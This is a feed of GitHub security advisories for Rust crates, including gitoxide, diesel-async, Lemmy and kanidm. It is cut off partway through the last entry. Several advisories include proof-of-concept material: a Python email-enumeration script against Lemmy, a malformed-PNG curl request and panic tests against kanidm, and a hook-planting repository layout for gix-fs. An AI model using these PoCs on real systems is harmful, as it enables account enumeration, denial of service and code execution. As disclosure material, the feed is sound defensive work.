<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
    <title>Security Advisory for Rust crates</title>
    <updated>2026-05-07T01:32:07.063Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
    <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[wasmtime] wasmtime has a panic when allocating a table exceeding the size of the host's address space]]></title>
        <id>https://github.com/advisories/GHSA-p8xm-42r7-89xg</id>
        <link href="https://github.com/advisories/GHSA-p8xm-42r7-89xg"/>
        <updated>2026-05-07T00:09:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Wasmtime's allocation logic for a WebAssembly table contained checked arithmetic which panicked on overflow. This overflow is possible to trigger, and thus panic, when a table with an extremely large size is allocated. This is possible with the WebAssembly memory64 proposal where tables can have sizes in the 64-bit range as opposed to the previous 32-bit range which would not overflow. The panic happens when attempting to create a very large table, such as when instantiating a WebAssembly module or component.</p>
<p>This bug does not affect the pooling allocator which limits tables sizes to much less than the required amount to trigger the overflow. This bug is only present for the on-demand instance allocator, which is Wasmtime's default allocator. This bug also requires the <code>memory64</code> WebAssembly feature to be enabled, which is on-by-default.</p>
<p>Panicking in the host process is considered a denial-of-service vector for Wasmtime.</p>
<h3 id="patches">Patches</h3>
<p>Wasmtime 36.0.8, 43.0.2, and 44.0.1 have all been released which fixes this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Embeddings can switch to using the pooling allocator to work around this issue, or the <code>memory64</code> WebAssembly proposal can be disabled. Otherwise there is no workaround and users are recommended to upgrade.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-p8xm-42r7-89xg">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-p8xm-42r7-89xg</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0114.html">https://rustsec.org/advisories/RUSTSEC-2026-0114.html</a></li>
<li><a href="https://github.com/advisories/GHSA-p8xm-42r7-89xg">https://github.com/advisories/GHSA-p8xm-42r7-89xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p8xm-42r7-89xg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T00:08:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wasmtime] wasmtime has a panic when allocating a table exceeding the size of the host's address space]]></title>
        <id>https://github.com/advisories/GHSA-p8xm-42r7-89xg</id>
        <link href="https://github.com/advisories/GHSA-p8xm-42r7-89xg"/>
        <updated>2026-05-07T00:09:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Wasmtime's allocation logic for a WebAssembly table contained checked arithmetic which panicked on overflow. This overflow is possible to trigger, and thus panic, when a table with an extremely large size is allocated. This is possible with the WebAssembly memory64 proposal where tables can have sizes in the 64-bit range as opposed to the previous 32-bit range which would not overflow. The panic happens when attempting to create a very large table, such as when instantiating a WebAssembly module or component.</p>
<p>This bug does not affect the pooling allocator which limits tables sizes to much less than the required amount to trigger the overflow. This bug is only present for the on-demand instance allocator, which is Wasmtime's default allocator. This bug also requires the <code>memory64</code> WebAssembly feature to be enabled, which is on-by-default.</p>
<p>Panicking in the host process is considered a denial-of-service vector for Wasmtime.</p>
<h3 id="patches">Patches</h3>
<p>Wasmtime 36.0.8, 43.0.2, and 44.0.1 have all been released which fixes this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Embeddings can switch to using the pooling allocator to work around this issue, or the <code>memory64</code> WebAssembly proposal can be disabled. Otherwise there is no workaround and users are recommended to upgrade.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-p8xm-42r7-89xg">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-p8xm-42r7-89xg</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0114.html">https://rustsec.org/advisories/RUSTSEC-2026-0114.html</a></li>
<li><a href="https://github.com/advisories/GHSA-p8xm-42r7-89xg">https://github.com/advisories/GHSA-p8xm-42r7-89xg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p8xm-42r7-89xg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T00:08:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diesel-async] diesel-async may expose uninitialized padding bytes for MySQL temporal columns]]></title>
        <id>https://github.com/advisories/GHSA-ff9q-rm55-q7qr</id>
        <link href="https://github.com/advisories/GHSA-ff9q-rm55-q7qr"/>
        <updated>2026-05-07T00:02:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>diesel-async exposes uninitialized stack padding to safe code on every read of a MySQL <code>DATE</code>, <code>TIME</code>, <code>DATETIME</code>, or <code>TIMESTAMP</code> column. Reading that buffer is undefined behavior, and the leaked bytes can contain stale heap/stack contents, so this is both a soundness bug and a potential information-disclosure vector.</p>
<h3 id="details">Details</h3>
<p>In <code>diesel-async/src/mysql/row.rs</code> (lines 65-103), <code>MysqlRow::get</code> builds a <code>MysqlTime</code> from the parsed <code>mysql_async::Value</code> and then fabricates the byte buffer that downstream <code>FromSql</code> impls expect like this:</p>
<pre><code class="language-rust">let date = MysqlTime::new(/* fields from Value::Date / Value::Time */);
let buffer = unsafe {
    let ptr = &amp;date as *const MysqlTime as *const u8;
    let slice = std::slice::from_raw_parts(ptr, std::mem::size_of::&lt;MysqlTime&gt;());
    slice.to_vec()
};
</code></pre>
<p><code>MysqlTime</code> is <code>#[repr(C)]</code> with 3 bytes of padding after <code>bool neg</code> (Linux x86_64, offsets 0x21..0x23). The literal construction leaves that padding uninitialized, and <code>to_vec()</code> carries it into a <code>Vec&lt;u8&gt;</code> that becomes the <code>MysqlValue</code>'s backing buffer, reachable from safe code via <code>MysqlValue::as_bytes() -&gt; &amp;[u8]</code>.</p>
<p><code>diesel</code> itself avoids this by going through <code>MaybeUninit::&lt;MysqlTime&gt;::zeroed()</code> + <code>ptr::copy_nonoverlapping</code> (see <code>diesel/src/mysql/value.rs:43-94</code>); the same pattern would fix this. Alternatively, write the bytes diesel's <code>FromSql</code> reads without round-tripping through a <code>MysqlTime</code> value.</p>
<h3 id="poc">PoC</h3>
<p><code>Cargo.toml</code>:</p>
<pre><code class="language-toml">[dependencies]
diesel = { version = "~2.3.0", default-features = false, features = ["mysql_backend"] }
diesel-async = { version = "=0.8.0", features = ["mysql"] }
mysql_common = { version = "0.35", default-features = false }
</code></pre>
<p><code>src/main.rs</code>:</p>
<pre><code class="language-rust">use diesel::row::{Field, Row};
use diesel_async::{AsyncConnectionCore, AsyncMysqlConnection};
use mysql_common::{constants::ColumnType, packets::Column, prelude::FromRow, value::Value};

type MysqlRow = &lt;AsyncMysqlConnection as AsyncConnectionCore&gt;::Row&lt;'static, 'static&gt;;

fn main() {
    let cols = std::sync::Arc::from([Column::new(ColumnType::MYSQL_TYPE_DATE)]);
    let raw = mysql_common::row::new_row(vec![Value::Date(2024, 1, 1, 0, 0, 0, 0)], cols);
    let row: MysqlRow = FromRow::from_row(raw);

    let field = row.get(0).unwrap();
    let bytes = field.value().unwrap().as_bytes();
    let _: u64 = bytes.iter().map(|&amp;b| b as u64).sum(); // UB: hits padding
}
</code></pre>
<p>Miri output:</p>
<pre><code>error: Undefined Behavior: reading memory at alloc844[0x21..0x22], but memory is uninitialized at [0x21..0x22], and this operation requires initialized memory
  --&gt; src/main.rs:14:37
   |
14 |     let _: u64 = bytes.iter().map(|&amp;b| b as u64).sum(); // UB: hits padding
   |                                     ^ Undefined Behavior occurred here
   |
   = help: this indicates a bug in the program: it performed an invalid operation, and caused Undefined Behavior
   = help: see https://doc.rust-lang.org/nightly/reference/behavior-considered-undefined.html for further information
   = note: stack backtrace:
           0: main::{closure#0}
               at src/main.rs:14:37: 14:38
           1: std::iter::adapters::map::map_fold::&lt;&amp;u8, u64, u64, {closure@src/main.rs:14:35: 14:39}, {closure@&lt;u64 as std::iter::Sum&gt;::sum&lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt;&gt;::{closure#0}}&gt;::{closure#0}
               at /home/paolobarbolini/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/adapters/map.rs:88:28: 88:34
           2: &lt;std::slice::Iter&lt;'_, u8&gt; as std::iter::Iterator&gt;::fold::&lt;u64, {closure@std::iter::adapters::map::map_fold&lt;&amp;u8, u64, u64, {closure@src/main.rs:14:35: 14:39}, {closure@&lt;u64 as std::iter::Sum&gt;::sum&lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt;&gt;::{closure#0}}&gt;::{closure#0}}&gt;
               at /home/paolobarbolini/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/slice/iter/macros.rs:279:27: 279:85
           3: &lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt; as std::iter::Iterator&gt;::fold::&lt;u64, {closure@&lt;u64 as std::iter::Sum&gt;::sum&lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt;&gt;::{closure#0}}&gt;
               at /home/paolobarbolini/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/adapters/map.rs:128:9: 128:50
           4: &lt;u64 as std::iter::Sum&gt;::sum::&lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt;&gt;
               at /home/paolobarbolini/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/traits/accum.rs:52:17: 56:18
           5: &lt;std::iter::Map&lt;std::slice::Iter&lt;'_, u8&gt;, {closure@src/main.rs:14:35: 14:39}&gt; as std::iter::Iterator&gt;::sum::&lt;u64&gt;
               at /home/paolobarbolini/.rustup/toolchains/nightly-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/iter/traits/iterator.rs:3676:9: 3676:23
           6: main
               at src/main.rs:14:18: 14:55

Uninitialized memory occurred at alloc844[0x21..0x22], in this allocation:
alloc844 (Rust heap, size: 48, align: 1) {
    0x00 │ e8 07 00 00 01 00 00 00 01 00 00 00 00 00 00 00 │ ................
    0x10 │ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │ ................
    0x20 │ 00 __ __ __ 01 00 00 00 00 00 00 00 __ __ __ __ │ .░░░........░░░░
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Soundness bug in safe API surface of <code>diesel-async</code>'s MySQL backend. Affects every user of <code>AsyncMysqlConnection</code> whose queries return a temporal column.</p>
<p>AI disclosure: this issue was found via Claude Code running Claude Opus 4.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel_async/security/advisories/GHSA-ff9q-rm55-q7qr">https://github.com/diesel-rs/diesel_async/security/advisories/GHSA-ff9q-rm55-q7qr</a></li>
<li><a href="https://github.com/diesel-rs/diesel_async/commit/18f2c861c51b4a5f23a20bd749eba13737b9e4aa">https://github.com/diesel-rs/diesel_async/commit/18f2c861c51b4a5f23a20bd749eba13737b9e4aa</a></li>
<li><a href="https://github.com/advisories/GHSA-ff9q-rm55-q7qr">https://github.com/advisories/GHSA-ff9q-rm55-q7qr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ff9q-rm55-q7qr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-07T00:02:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gix-fs] gix-fs: Symlink prefix-reuse allows worktree escape during checkout]]></title>
        <id>https://github.com/advisories/GHSA-f89h-2fjh-2r9q</id>
        <link href="https://github.com/advisories/GHSA-f89h-2fjh-2r9q"/>
        <updated>2026-05-07T00:01:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A malicious tree can be constructed that will, when checked out with gitoxide, permit writing an attacker-controlled symlink into any existing directory the user has write access to.</p>
<h3 id="details">Details</h3>
<p>During checkout, all symlink index entries are deferred and created after regular files using a single shared <code>gix_worktree::Stack</code>. Internally, this uses a <code>gix_fs::Stack</code>.</p>
<p><code>gix_fs::Stack::make_relative_path_current()</code> caches validated path prefixes: when the previously-processed leaf component exactly matches the leading component(s) of the next path, the leaf-to-directory transition at <code>gix-fs/src/stack.rs:195-197</code> invokes only <code>delegate.push_directory()</code>, never <code>delegate.push()</code>.</p>
<p>In <code>gix_worktree::stack::delegate::StackDelegate</code>, when the state member is <code>State::CreateDirectoryAndAttributesStack</code>, <code>Attributes::push_directory()</code> only loads attributes (from the ODB, in the clone case), and does not perform any other checks. The on-disk <code>symlink_metadata()</code> check and unlink-on-collision live in <code>StackDelegate::push()</code>'s invocation of <code>create_leading_directory()</code>, which is therefore bypassed for the cached prefix. The final symlink is created with plain <code>std::os::unix::fs::symlink</code>, which follows symlinks in parent directories.</p>
<p>Therefore, it's possible to provide a tree with duplicate symlink and directory entries that exploits this. If a tree is constructed with:</p>
<ol>
<li>A <code>120000</code> (symlink) entry <code>a</code> that points to <code>.git/hooks</code>.</li>
<li>A <code>040000</code> (directory) entry <code>a</code> with a subtree that contains a symlink from <code>post-checkout</code> to <code>../../payload</code>.</li>
<li>A <code>100755</code> (executable file) entry <code>payload</code>.</li>
</ol>
<p>This is converted by <code>gix_index::State::from_tree()</code> into index entries <code>["a" (SYMLINK), "a/post-checkout" (SYMLINK)]</code>.</p>
<p>Then, during the delayed symlink phase:</p>
<ol>
<li><code>a</code> is created as a symlink to e.g. <code>.git/hooks</code>.</li>
<li>When processing <code>a/post-checkout</code>, the <code>a</code> prefix is reused from the just-processed leaf entry without re-running the intermediate-directory check, after which…</li>
<li><code>symlink(target, "&lt;wt&gt;/a/post-checkout")</code> resolves through the just-created symlink to write <code>.git/hooks/post-checkout</code>.</li>
</ol>
<p>Although this example uses <code>.git/hooks</code> for simplicity, there's no actual requirement to write within the repo checkout. This can be fairly easily chained into code execution by writing to something that is known to be executed — for example, by writing to <code>.git/hooks/post-checkout</code> if the attacker knows that a hook-aware Git implementation will be used later, or by writing to something like <code>~/.local/bin</code>.</p>
<h3 id="poc">PoC</h3>
<p>Attached is <a href="https://github.com/user-attachments/files/27223800/build-bad-repo.sh">build-bad-repo.sh</a>, which builds a repo with the aforementioned tree structure. Cloning it with <code>gix</code> will set up the malicious <code>.git/hooks/post-checkout</code>, at which point anything that normally invokes the <code>post-checkout</code> hook will result in its execution, such as <code>git checkout -b new-branch</code>.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary symlink creation into any existing directory the user can write to.</p>
<h3 id="disclosure">Disclosure</h3>
<p>This vulnerability was found by AI (specifically, Claude Mythos) as part of <a href="https://www.anthropic.com/glasswing">Project Glasswing</a>. This advisory was written and verified by a human.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f89h-2fjh-2r9q">https://github.com/GitoxideLabs/gitoxide/security/advisories/GHSA-f89h-2fjh-2r9q</a></li>
<li><a href="https://github.com/advisories/GHSA-f89h-2fjh-2r9q">https://github.com/advisories/GHSA-f89h-2fjh-2r9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f89h-2fjh-2r9q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T00:01:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemmy_api] Lemmy resend-verification endpoint exposes registered email addresses to unauthenticated users]]></title>
        <id>https://github.com/advisories/GHSA-qxrw-f6fh-34r7</id>
        <link href="https://github.com/advisories/GHSA-qxrw-f6fh-34r7"/>
        <updated>2026-05-06T23:49:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The unauthenticated resend-verification endpoint returns different responses for registered and unregistered email addresses. A malicious third party can submit candidate addresses to <code>/api/v4/account/auth/resend_verification_email</code> and distinguish accounts from misses.</p>
<h2 id="details">Details</h2>
<p><code>resend_verification_email()</code> looks up the submitted address and returns the lookup error to the caller:</p>
<pre><code class="language-rust">let local_user_view = LocalUserView::find_by_email(&amp;mut context.pool(), &amp;email).await?;
check_local_user_valid(&amp;local_user_view)?;
</code></pre>
<p>The password reset endpoint already uses a safer pattern. It discards lookup errors and returns success, which prevents the same account-discovery channel.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The following script creates one user and probes that address plus a missing address.</p>
<pre><code class="language-python">import requests, random, string

BASE = "http://127.0.0.1:8536/api/v4"  # change to the target Lemmy URL
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"
PASSWORD = "Password123456!"

def post(path, **body):
    return requests.post(BASE + path, json=body)

suffix = "enum" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
admin = post("/account/auth/login", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()["jwt"]
requests.put(BASE + "/site", headers={"Authorization": "Bearer " + admin},
             json={"registration_mode": "open", "email_verification_required": False})

email = "alice" + suffix + "@example.test"
post("/account/auth/register", username="alice" + suffix, password=PASSWORD,
     password_verify=PASSWORD, email=email).raise_for_status()

for candidate in [email, "missing" + suffix + "@example.test"]:
    r = post("/account/auth/resend_verification_email", email=candidate)
    print(candidate, "HTTP", r.status_code, r.text[:300])
</code></pre>
<p>Output:</p>
<pre><code class="language-text">alicepoceudtpf@example.test HTTP 200 {"success":true}
missingpoceudtpf@example.test HTTP 404 {"error":"not_found","cause":"Record not found"}
</code></pre>
<h2 id="impact">Impact</h2>
<p>A malicious third party can enumerate registered email addresses without authentication. The endpoint uses the registration rate limit bucket, not an endpoint-specific anti-enumeration limit, so the attacker can automate probes across candidate address lists. The response also distinguishes missing accounts from banned or deleted accounts because <code>check_local_user_valid()</code> returns separate error types.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Use the password-reset pattern for resend verification. Move the lookup and email-send work into a helper, ignore helper errors in the handler, and always return <code>{"success": true}</code> for syntactically valid input.</p>
<hr>
<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/LemmyNet/lemmy/security/advisories/GHSA-qxrw-f6fh-34r7">https://github.com/LemmyNet/lemmy/security/advisories/GHSA-qxrw-f6fh-34r7</a></li>
<li><a href="https://github.com/LemmyNet/lemmy/commit/4afff1699d08920b9a9023e81b229d772b894d91">https://github.com/LemmyNet/lemmy/commit/4afff1699d08920b9a9023e81b229d772b894d91</a></li>
<li><a href="https://github.com/advisories/GHSA-qxrw-f6fh-34r7">https://github.com/advisories/GHSA-qxrw-f6fh-34r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qxrw-f6fh-34r7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T23:49:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ldap3_proto] ldap3_proto has LDAP Filter stack exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-qcxq-75wr-5cm8</id>
        <link href="https://github.com/advisories/GHSA-qcxq-75wr-5cm8"/>
        <updated>2026-05-06T23:39:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>LDAP queries are not validated for depth, which can cause the parser (both PEG and ASN) to exhaust the stack. This <em>may</em> cause a denial of service in applications that process queries.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="resources">Resources</h3>
<p>Related to GHSA-r5fr-9gmv-jggh</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/ldap3/security/advisories/GHSA-qcxq-75wr-5cm8">https://github.com/kanidm/ldap3/security/advisories/GHSA-qcxq-75wr-5cm8</a></li>
<li><a href="https://github.com/advisories/GHSA-r5fr-9gmv-jggh">https://github.com/advisories/GHSA-r5fr-9gmv-jggh</a></li>
<li><a href="https://github.com/advisories/GHSA-qcxq-75wr-5cm8">https://github.com/advisories/GHSA-qcxq-75wr-5cm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcxq-75wr-5cm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T23:39:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kanidmd_lib] kanidmd_lib: Image upload validators run before authorization; PNG validator panics on malformed input]]></title>
        <id>https://github.com/advisories/GHSA-84jc-3hj2-hwc7</id>
        <link href="https://github.com/advisories/GHSA-84jc-3hj2-hwc7"/>
        <updated>2026-05-06T23:39:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>POST /v1/domain/_image</code> and <code>POST /v1/oauth2/{rs_name}/_image</code> handlers call <code>validate_image()</code> on the uploaded body <strong>before</strong> the ACL check that restricts image upload to admins. Any bug in an image validator is therefore reachable by an unauthenticated remote client rather than being admin-gated.</p>
<p>One such bug exists today: <code>png_has_trailer()</code> panics on inputs shorter than 8 bytes, or whose first chunk-length field is near <code>u32::MAX</code>.</p>
<p><strong>On a default build this has no server-wide impact.</strong> The panic unwinds only the requester's own tokio task; the server process survives, no shared state is poisoned, and other connections are unaffected. This was reported privately rather than as a public issue because (a) the project previously treated an admin-triggered thread crash of identical impact as security-relevant (e51d0dee4), and this is reachable by a broader population; and (b) a downstream build with <code>panic = "abort"</code> would upgrade it to an unauthenticated process-crash DoS.</p>
<h3 id="details">Details</h3>
<h4 id="validate-before-authorize-ordering">Validate-before-authorize ordering</h4>
<p>Both handlers parse and validate attacker-controlled bytes before checking whether the caller is permitted to upload at all:</p>
<ul>
<li><code>server/core/src/https/v1_domain.rs:118</code> — <code>image.validate_image()</code> runs; <code>handle_image_update(client_auth_info, …)</code> (the ACL check) is at line 129.</li>
<li><code>server/core/src/https/v1_oauth2.rs:550</code> — same ordering.</li>
</ul>
<p>The <code>VerifiedClientInformation</code> extractor (<code>server/core/src/https/extractors/mod.rs:18-90</code>) always returns <code>Ok</code> — it builds a <code>ClientAuthInfo</code> from whatever credentials are present (including none) and does not reject anonymous callers. Authorization is deferred to <code>handle_image_update()</code>, which is never reached if the validator panics or errors first.</p>
<h4 id="png-validator-panic-demonstrator">PNG validator panic (demonstrator)</h4>
<p><code>validate_image()</code> (<code>server/lib/src/valueset/image/mod.rs:98</code>) checks only a 256 KiB maximum size, not a minimum, before dispatching to the format-specific validator.</p>
<p><strong>Short input</strong> — <code>server/lib/src/valueset/image/png.rs:73-76</code>:</p>
<pre><code class="language-rust">pub fn png_has_trailer(contents: &amp;Vec&lt;u8&gt;) -&gt; Result&lt;bool, ImageValidationError&gt; {
    let buf = contents.as_slice();
    let (magic, buf) = buf.split_at(PNG_PRELUDE.len()); // 8; panics if len &lt; 8
</code></pre>
<p><strong>Chunk-length overflow</strong> — <code>server/lib/src/valueset/image/png.rs:46,53</code>:</p>
<pre><code class="language-rust">if buf.len() &lt; (length + 4) as usize {   // length: u32; wraps before the usize cast
    ...
}
let (_, buf) = buf.split_at(length as usize);   // panics for length ≈ u32::MAX
</code></pre>
<p>In a release build <code>0xFFFF_FFFC + 4</code> wraps to <code>0</code>, the guard passes, and <code>split_at</code> panics.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-sh">printf '\x89PNG' &gt; /tmp/short.png
curl -sk https://$KANIDM_HOST/v1/domain/_image \
     -F 'image=@/tmp/short.png;type=image/png;filename=x.png'
# → connection reset / empty reply; server process remains up
</code></pre>
<p>Unit-test confirmation (<code>cargo test -p kanidmd_lib --lib</code>):</p>
<pre><code class="language-rust">#[test]
fn audit_png_short_input_panics() {
    let short = vec![0x89u8, 0x50, 0x4e, 0x47];
    assert!(std::panic::catch_unwind(|| png_has_trailer(&amp;short)).is_err());
}

#[test]
fn audit_png_chunk_length_overflow_panics() {
    let mut data = vec![0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
    data.extend_from_slice(&amp;[0xFF, 0xFF, 0xFF, 0xFD]);
    data.extend_from_slice(b"IHDR");
    data.extend_from_slice(&amp;[0u8; 8]);
    assert!(std::panic::catch_unwind(|| png_has_trailer(&amp;data)).is_err());
}
</code></pre>
<p>Both tests pass (i.e. both inputs panic).</p>
<h3 id="impact">Impact</h3>
<p>The only party affected is the requester, whose own connection is dropped. Repeating the request has no cumulative effect beyond ordinary request load.</p>
<p>On the upstream build:</p>
<ul>
<li>Each connection runs in its own <code>tokio::task::spawn</code> (<code>server/core/src/https/mod.rs:481</code>); the accept loop continues after a task panic.</li>
<li>No <code>panic = "abort"</code> in any workspace <code>[profile.*]</code>.</li>
<li>No <code>Mutex</code>/<code>RwLock</code> held across the call site; nothing is poisoned.</li>
<li>The panic occurs before any write actor is messaged; no DB or replication state is touched.</li>
</ul>
<p><strong>Residual risk:</strong> a downstream packager that sets <code>panic = "abort"</code> (or links code that installs an abort handler) would see a full unauthenticated process crash. (No such packager is known)</p>
<p><strong>Affected:</strong> v1.1.0-rc.15 (introduced in e7f594a1c, #2112) through <code>master</code> @ edf50b9da.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/kanidm/security/advisories/GHSA-84jc-3hj2-hwc7">https://github.com/kanidm/kanidm/security/advisories/GHSA-84jc-3hj2-hwc7</a></li>
<li><a href="https://github.com/advisories/GHSA-84jc-3hj2-hwc7">https://github.com/advisories/GHSA-84jc-3hj2-hwc7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84jc-3hj2-hwc7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-06T23:39:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kanidm_proto] scim_proton and kanidm_proto have an authenticated process abort via SCIM filter stack exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-r5fr-9gmv-jggh</id>
        <link href="https://github.com/advisories/GHSA-r5fr-9gmv-jggh"/>
        <updated>2026-05-06T23:38:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A single unauthenticated <code>GET</code> to any <code>/scim/v1/...</code> endpoint with a <code>?filter=</code> query string of a few thousand nested parentheses (≈ 4–12 KB) drives the recursive-descent PEG parser past the worker thread's stack guard page. Rust responds to stack overflow with <code>std::process::abort()</code> — the entire <code>kanidmd</code> process exits. The parse runs inside axum's <code>Query&lt;ScimEntryGetQuery&gt;</code> extractor, before any handler body and therefore before any ACL check.</p>
<h3 id="details">Details</h3>
<p>The SCIM filter grammar recurses on <code>(</code> and <code>not (</code> with no depth bound.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:263-433</code></strong> — <code>peg::parser! { grammar scimfilter() ... }</code>:</p>
<pre><code class="language-rust">// line 281
"not" separator()+ "(" e:parse() ")" { ScimFilter::Not(Box::new(e)) }
// line 293
"(" e:parse() ")" { e }
</code></pre>
<p>Both rules re-enter <code>parse()</code> without a depth counter.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:442-447</code></strong> — <code>impl FromStr for ScimFilter</code> calls <code>scimfilter::parse(input)</code> directly on the raw string with no length or depth pre-check.</p>
<p><strong><code>proto/src/scim_v1/mod.rs:80-81</code></strong> — <code>ScimEntryGetQuery.filter</code> is <code>#[serde_as(as = "Option&lt;DisplayFromStr&gt;")]</code>, so deserialising the query struct invokes <code>ScimFilter::from_str</code> on attacker bytes.</p>
<p><strong>Unauthenticated reachability</strong> — nine handlers in <code>server/core/src/https/v1_scim.rs</code> (route table at lines 865-1029) take <code>Query&lt;ScimEntryGetQuery&gt;</code> as an argument: <code>/scim/v1/Entry</code>, <code>/scim/v1/Entry/{id}</code>, <code>/scim/v1/Person/{id}</code>, <code>/scim/v1/Application</code>, <code>/scim/v1/Application/{id}</code>, <code>/scim/v1/Class</code>, <code>/scim/v1/Attribute</code>, <code>/scim/v1/Message</code>, <code>/scim/v1/Message/{id}</code>. The SCIM router is merged unconditionally for every server role (<code>server/core/src/https/mod.rs:312</code>).</p>
<p>Axum extracts handler arguments before the handler body runs. The preceding <code>VerifiedClientInformation</code> extractor (<code>server/core/src/https/extractors/mod.rs:16-91</code>) always returns <code>Ok</code> (line 89) regardless of credentials; authorization is deferred to the handler body, which is never reached.</p>
<p>The existing semantic depth limit (<code>DEFAULT_LIMIT_FILTER_DEPTH_MAX = 12</code>, <code>server/lib/src/constants/mod.rs:212</code>) is enforced in <code>Filter::from_scim_ro</code> (<code>server/lib/src/filter.rs:786</code>) <strong>after</strong> the PEG parse has already produced an AST, so it cannot prevent the parser itself from blowing the stack.</p>
